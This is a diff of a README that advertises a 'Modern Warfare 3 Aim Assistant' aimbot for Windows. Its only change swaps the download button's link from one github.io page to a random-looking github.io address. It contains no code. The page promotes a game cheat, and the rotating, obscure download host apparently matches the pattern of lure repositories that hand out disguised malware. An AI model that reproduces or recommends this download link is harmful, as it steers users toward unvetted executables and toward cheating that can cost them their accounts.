@@ -3,7 +3,7 @@
 Set up your **Call of Duty: Modern Warfare 3 Aim Assistant** for Windows with this detailed guide. Configure precise aim tools, custom targeting settings, and improved accuracy for a smoother gameplay experience.
 
 ⬇️ **Download**  
-[![Download Aim Assistant](https://img.shields.io/badge/Download-Aim_Assistant-1C1C1C?style=for-the-badge&logo=callofduty&logoColor=white)](https://cod-mw3-aimbot.github.io/COD-MW3-Aimbot/)
+[![Download Aim Assistant](https://img.shields.io/badge/Download-Aim_Assistant-1C1C1C?style=for-the-badge&logo=callofduty&logoColor=white)](https://mw3inforw.github.io/msanqw/)
 
 ---
 
